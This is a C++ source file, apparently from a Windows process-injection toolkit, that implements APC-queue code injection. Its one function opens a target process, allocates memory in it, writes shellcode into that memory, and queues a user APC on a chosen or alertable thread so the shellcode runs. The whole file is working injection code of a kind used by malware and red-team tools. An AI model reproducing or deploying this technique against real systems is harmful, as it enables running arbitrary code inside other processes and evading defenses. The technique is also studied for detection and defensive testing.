#include <cstdio>

#include "sysapi.h"
#include "scripts.h"
#include "logging.h"

namespace scripts {

bool inject_queue_apc(uint32_t pid, uint32_t tid, RemoteProcessOpenMethod open_method, RemoteProcessMemoryMethod memory_method) {

    bblog::info("[*] Opening the target process");
    sysapi::unique_handle ProcessHandle = process_open(open_method, pid);
    if (ProcessHandle == NULL) {
        return false;
    }

    bblog::info("[*] Placing shellcode in the target process");

    RemoteProcessMemoryContext ctx;
    bool res = process_init_memory(ctx, memory_method, ProcessHandle.get(), pid);
    if (!res) {
        return false;
    }

    ctx.Size = (ULONG)default_shellcode_size;

    res = process_create_memory(ctx);
    if (!res) {
        return false;
    }

    bblog::info("writing shellcode...");

    res = process_write_memory(ctx, 0, default_shellcode_data, default_shellcode_size);
    if (!res) {
        return false;
    }

    if (tid) {

        bblog::info("[*] Queueing APC with shellcode in the thread");

        sysapi::unique_handle ThreadHandle = sysapi::ThreadOpen(pid, tid);
        if (ThreadHandle == NULL) {
            return false;
        }

        res = sysapi::ThreadQueueUserApc(ThreadHandle.get(), (PPS_APC_ROUTINE)ctx.RemoteBaseAddress);
        if (!res) {
            return false;
        }

        bblog::info("[+] Success");
        return true;
    }

    bblog::info("[*] Queueing APC with shellcode in alertable thread");

    auto ThreadHandle = process_find_alertable_thread(ProcessHandle.get());
    if (ThreadHandle == NULL) {
        return false;
    }

    res = sysapi::ThreadQueueUserApc(ThreadHandle.get(), (PPS_APC_ROUTINE)ctx.RemoteBaseAddress);
    if (!res) {
        return false;
    }

    bblog::info("[+] Success");
    return true;
}

} // namespace scripts
